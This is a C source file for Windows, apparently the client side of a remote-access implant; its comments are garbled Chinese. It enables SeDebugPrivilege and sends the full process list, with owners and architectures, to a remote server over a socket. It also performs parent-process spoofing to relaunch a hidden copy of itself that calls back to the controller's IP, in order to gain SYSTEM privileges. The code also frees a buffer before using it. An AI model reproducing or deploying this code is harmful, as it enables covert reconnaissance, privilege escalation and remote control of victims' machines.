#include "process.h"

// ָ�����͵�ַ
extern char ip[25];

// ���õ���Ȩ��
void EnableDebugAbility()
{
	// ���ƾ��
	HANDLE hProcessToken = NULL;
	// 1.�򿪽��̷�������
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hProcessToken))
	{
		return;
	}

	// 2.ȡ��SeDebugPrivilege��Ȩ��LUIDֵ
	LUID luid;
	if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid))
	{
		return;
	}

	// 3.��������������Ȩ
	TOKEN_PRIVILEGES token;
	token.PrivilegeCount = 1;
	token.Privileges[0].Luid = luid;
	// ʹ��Ȩ��Ч
	token.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	if (!AdjustTokenPrivileges(hProcessToken, FALSE, &token, 0, NULL, NULL))
	{
		return;
	}

	CloseHandle(hProcessToken);
	return;
}

// ��ȡ����\�û���
void GetAccount(PSID userSid, char buffer[])
{
	// �û���
	TCHAR userName[255];
	DWORD bufferLen = 255;
	// ����
	TCHAR domainName[255];
	DWORD domainNameBufferLen = 255;
	SID_NAME_USE peUse;

	// �ɹ���ȡ
	if (LookupAccountSid(NULL, userSid, userName, &bufferLen, domainName, &domainNameBufferLen, &peUse))
	{
		char tempDomainName[255];
		char tempUserName[255];

		// ��ת��char *
		TcharToStr(domainName, tempDomainName);
		TcharToStr(userName, tempUserName);

		// ƴ������\�û���
		strcat(buffer, tempDomainName);
		strcat(buffer, "\\");
		strcat(buffer, tempUserName);
		return;
	}

	// ʧ�� buffer��ֵΪ�ո�
	strcat(buffer, " ");
}

// ��ȡ�����б�ָ��
PWTS_PROCESS_INFO_EX GetProcessList(DWORD* processCnt)
{
	DWORD level = 1;
	// ���������Ϣ
	PWTS_PROCESS_INFO_EX processList = NULL;
	WTSEnumerateProcessesEx(WTS_CURRENT_SERVER_HANDLE, &level, WTS_ANY_SESSION, (LPTSTR*)&processList, processCnt);
	return processList;
}

// ��ȡָ��PID���̵�λ��
int GetProcessPlatform(DWORD dwProcessID)
{
	typedef BOOL(WINAPI* LPFN_ISWOW64PROCESS) (HANDLE, PBOOL);

	static LPFN_ISWOW64PROCESS fnIsWow64Process = NULL;

	if (NULL == fnIsWow64Process)
	{
		HMODULE hKernel32 = GetModuleHandle(L"kernel32");
		if (NULL == hKernel32)
		{
			return 0;
		}

		fnIsWow64Process = (LPFN_ISWOW64PROCESS)GetProcAddress(hKernel32, "IsWow64Process");
		if (NULL == fnIsWow64Process)
		{
			return 0;
		}
	}

	static UINT OSPlatform = 0;
	if (0 == OSPlatform)
	{
		HANDLE hCurProcess = GetCurrentProcess();
		if (NULL == hCurProcess)
		{
			return 0;
		}

		BOOL bWow64 = FALSE;
		BOOL bError = fnIsWow64Process(hCurProcess, &bWow64);
		CloseHandle(hCurProcess);
		if (FALSE == bError)
		{
			return 0;
		}

#ifdef _WIN64
		OSPlatform = 64;
#else
		OSPlatform = bWow64 ? 64 : 32;
#endif // _WIN64
	}

	if (32 == OSPlatform)
	{
		return 32;
	}


	UINT uRet = 0;
	HANDLE hDstProcess = NULL;
	BOOL bError = FALSE;
	BOOL bWow64 = FALSE;

	hDstProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, dwProcessID);
	if (NULL == hDstProcess)
	{
		goto FUN_CLEANUP;
	}

	bError = fnIsWow64Process(hDstProcess, &bWow64);
	if (FALSE == bError)
	{
		goto FUN_CLEANUP;
	}

	uRet = bWow64 ? 32 : 64;

FUN_CLEANUP:
	if (NULL != hDstProcess)
	{
		CloseHandle(hDstProcess);
		hDstProcess = NULL;
	}

	return uRet;
}

// �鿴������Ϣ����
BOOL PS(SOCKET sServer, char cmd[])
{
	// �Ƿ�ִ��ps����
	if (_strnicmp(cmd, "ps", 2) != 0)
		return FALSE;

	// �����õ�����Ȩ��
	EnableDebugAbility();

	// ������
	DWORD processCnt = 0;
	// ��ȡ�б�ָ��
	PWTS_PROCESS_INFO_EX processList = GetProcessList(&processCnt);
	// ���ʹ�����Ϣ���Է�
	if (!processList)
	{
		SendError(sServer);
		return TRUE;
	}

	SendSuccess(sServer);

	// ����ṹ��ָ��
	PWTS_PROCESS_INFO_EX tempList = processList;
	// ��һ��������ϵͳ����û��Ҫ����
	tempList++;

	char buffer[256] = { 0 };
	ZeroMemory(buffer, sizeof(buffer));
	processCnt--;

	// ���ͽ�����
	IntToStr(processCnt, buffer);
	SendData(sServer, buffer, sizeof(buffer));

	// ���ͽ�����Ϣ
	for (DWORD i = 0; i < processCnt; i++)
	{
		// ����PID
		IntToStr(tempList->ProcessId, buffer);
		send(sServer, buffer, sizeof(buffer), 0);
		ZeroMemory(buffer, sizeof(buffer));

		// ���ͽ�����
		LpwstrToStr(tempList->pProcessName, buffer);
		send(sServer, buffer, sizeof(buffer), 0);
		ZeroMemory(buffer, sizeof(buffer));

		// ����λ��
		int arch = GetProcessPlatform(tempList->ProcessId);
		if (arch == 0)
			strcat(buffer, " ");
		else if (arch == 32)
			strcat(buffer, "x86");
		else
			strcat(buffer, "x64");

		send(sServer, buffer, sizeof(buffer), 0);
		ZeroMemory(buffer, sizeof(buffer));

		// ��������\�û���
		GetAccount(tempList->pUserSid, buffer);
		send(sServer, buffer, sizeof(buffer), 0);
		ZeroMemory(buffer, sizeof(buffer));

		Sleep(2);
		// �Ƶ���һ������
		tempList++;
	}


	Sleep(10);
	// �ͷ��ڴ�
	WTSFreeMemoryEx(WTSTypeProcessInfoLevel1, processList, processCnt);
	processList = NULL;
	return TRUE;
}

// ��������ƭ
BOOL PPIDSpoofing(SOCKET sServer,DWORD PID)
{
	HANDLE hProcess = OpenProcess(MAXIMUM_ALLOWED, FALSE, PID);
	// �򿪽���ʧ��
	if (!hProcess)
	{
		return FALSE;
	}

	STARTUPINFOEX si;
	PROCESS_INFORMATION pi;

	// ��ʼ��
	ZeroMemory(&pi, sizeof(pi));
	ZeroMemory(&si, sizeof(si));
	ZeroMemory(&si.StartupInfo, sizeof(STARTUPINFO));
	si.StartupInfo.cb = sizeof(STARTUPINFO);
	si.StartupInfo.wShowWindow = SW_HIDE;
	si.StartupInfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;

	SIZE_T lpsize = 0;
	// ��ȡҪ����� �����б� ��С
	InitializeProcThreadAttributeList(NULL, 1, 0, &lpsize);

	char* temp = (char*)malloc(sizeof(char) * lpsize);

	/* ת��ָ�뵽��ȷ���� */
	si.lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)temp;
	free(temp);

	/* ����Ϊ�ṹ���ʼ�����Բ��� */
	InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &lpsize);

	/* �������Ա� */
	if (!UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hProcess, sizeof(HANDLE), NULL, NULL))
	{
		return FALSE;
	}

	/* ����һ���µ�client.exe */

	// ��ȡclient.exe ����·��
	TCHAR tempPath[MAX_PATH];
	GetModuleFileName(NULL, tempPath, MAX_PATH);
	// ת����char *��ʽ
	char currentPath[MAX_PATH] = { 0 };
	TcharToStr(tempPath, currentPath);

	// �������10000-65535 ֮��Ķ˿�
	char port[10] = { 0 };
	IntToStr(randomNumber(10000, 65535), port);

	// ���������ƴ��
	char cmdLine[MAX_PATH] = "cmd.exe /c ";
	strcat(cmdLine, "\"");
	strcat(cmdLine, currentPath);
	strcat(cmdLine, "\" ");
	// ƴ��ip
	strcat(cmdLine, ip);
	strcat(cmdLine, " ");
	// ƴ�Ӷ˿�
	strcat(cmdLine, port);

	// cmd��client.exeʧ��							�������
	if (!CreateProcessA(NULL, cmdLine, NULL, NULL, FALSE, CREATE_SUSPENDED | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, (LPSTARTUPINFOA)&si.StartupInfo, &pi))
	{
		return FALSE;
	}

	// ���ϴ������ִ�гɹ���˵����������ƭ���

	// ���´����ܲ��ܳɹ�����ȫ���Է������Ƿ������ɹ�

	// ���Ͷ˿ڸ��Է�
	SendData(sServer, port, sizeof(port));
	// �Է��������̳ɹ�
	if (!IsRecvError(sServer))
	{
		// �ָ��߳�
		ResumeThread(pi.hThread);
		printf("getsystem sucess\n");
	}

	// ��β����
	CloseHandle(pi.hProcess);
	CloseHandle(hProcess);
	CloseHandle(pi.hThread);
	DeleteProcThreadAttributeList(si.lpAttributeList);
	return TRUE;
}

